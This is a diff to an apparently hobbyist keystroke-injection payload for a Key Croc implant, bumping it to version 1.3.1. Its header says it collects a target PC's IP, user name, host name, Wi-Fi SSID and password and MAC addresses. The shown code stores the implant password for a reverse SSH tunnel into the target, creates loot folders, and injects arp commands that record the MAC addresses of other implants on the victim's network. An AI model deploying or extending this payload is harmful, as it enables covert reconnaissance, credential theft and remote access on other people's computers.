@@ -4,7 +4,7 @@
 #                (ip address, current user name, pc host name, ssid and passwd, mac address)
 #                save to tools/Croc_pot folder
 # Author:        Spywill
-# Version:       1.3
+# Version:       1.3.1
 # Category:      Key Croc
 
 MATCH crocpot
@@ -18,6 +18,13 @@ PC_PW=LINUX
 #---> Save keycroc passwd in temp folder
 #---> This is used for starting Reverse SSH Tunnel with Target PC
 echo "${CROC_PW}" >> /tmp/CPW.txt
+
+#----Create Croc_Pot folders
+if [[ -d "/root/udisk/loot/Croc_Pot" && "/root/udisk/tools/Croc_Pot" ]]; then
+	LED B
+else
+	mkdir -p /root/udisk/loot/Croc_Pot /root/udisk/tools/Croc_Pot
+fi
 
 #---> Payload variable/remove existing OS detection
 CROC_OS=/root/udisk/tools/Croc_Pot/Croc_OS.txt
@@ -75,7 +82,7 @@ WINDOWS)
 	Q STRING "arp -a 172.16.32.1 | Select-String '([0-9a-f]{2}-){5}[0-9a-f]{2}' | Select-Object -Expand Matches | Select-Object -Expand Value | out-file -encoding UTF8 \"\$Croc\tools\Croc_Pot\squirrel_mac.txt\""
 	Q ENTER
 	sleep 2
-	#---> Retrieve Lan turtle MAC address if connected to local network as target PC & save to tools/Croc_Pot/squirrel_mac.txt
+	#---> Retrieve Lan turtle MAC address if connected to local network as target PC & save to tools/Croc_Pot/turtle_mac.txt
 	Q STRING "arp -a 172.16.84.1 | Select-String '([0-9a-f]{2}-){5}[0-9a-f]{2}' | Select-Object -Expand Matches | Select-Object -Expand Value | out-file -encoding UTF8 \"\$Croc\tools\Croc_Pot\turtle_mac.txt\""
 	Q ENTER
 	sleep 2
@@ -174,7 +181,7 @@ raspberrypi)
 	Q STRING "arp squirrel.lan | awk '/'squirrel.lan'/{print \$3}' | sed -e 's/HWaddress//g' | tee /media/\$(whoami)/KeyCroc/tools/Croc_Pot/squirrel_mac.txt"
 	Q ENTER
 	sleep 2
-	#---> Retrieve Lan turtle MAC address if connected to local network as target PC & save to tools/Croc_Pot/squirrel_mac.txt
+	#---> Retrieve Lan turtle MAC address if connected to local network as target PC & save to tools/Croc_Pot/turtle_mac.txt
 	Q STRING "arp 172.16.84.1 | awk '/'172.16.84.1'/{print \$3}' | sed -e 's/HWaddress//g' | tee /media/\$(whoami)/KeyCroc/tools/Croc_Pot/turtle_mac.txt"
 	Q ENTER
 	sleep 2
@@ -249,7 +256,7 @@ parrot)
 	Q STRING "arp squirrel.lan | awk '/'squirrel.lan'/{print \$3}' | sed -e 's/HWaddress//g' | tee /media/\$(whoami)/KeyCroc/tools/Croc_Pot/squirrel_mac.txt"
 	Q ENTER
 	sleep 2
-	#---> Retrieve Lan turtle MAC address if connected to local network as target PC & save to tools/Croc_Pot/squirrel_mac.txt
+	#---> Retrieve Lan turtle MAC address if connected to local network as target PC & save to tools/Croc_Pot/turtle_mac.txt
 	Q STRING "arp 172.16.84.1 | awk '/'172.16.84.1'/{print \$3}' | sed -e 's/HWaddress//g' | tee /media/\$(whoami)/KeyCroc/tools/Croc_Pot/turtle_mac.txt"
 	Q ENTER
 	sleep 2
@@ -332,7 +339,7 @@ parrot)
 	Q STRING "arp squirrel.lan | awk '/'squirrel.lan'/{print \$3}' | sed -e 's/HWaddress//g' | tee /media/\$(whoami)/KeyCroc/tools/Croc_Pot/squirrel_mac.txt"
 	Q ENTER
 	sleep 2
-	#---> Retrieve Lan turtle MAC address if connected to local network as target PC & save to tools/Croc_Pot/squirrel_mac.txt
+	#---> Retrieve Lan turtle MAC address if connected to local network as target PC & save to tools/Croc_Pot/turtle_mac.txt
 	Q STRING "arp 172.16.84.1 | awk '/'172.16.84.1'/{print \$3}' | sed -e 's/HWaddress//g' | tee /media/\$(whoami)/KeyCroc/tools/Croc_Pot/turtle_mac.txt"
 	Q ENTER
 	sleep 2
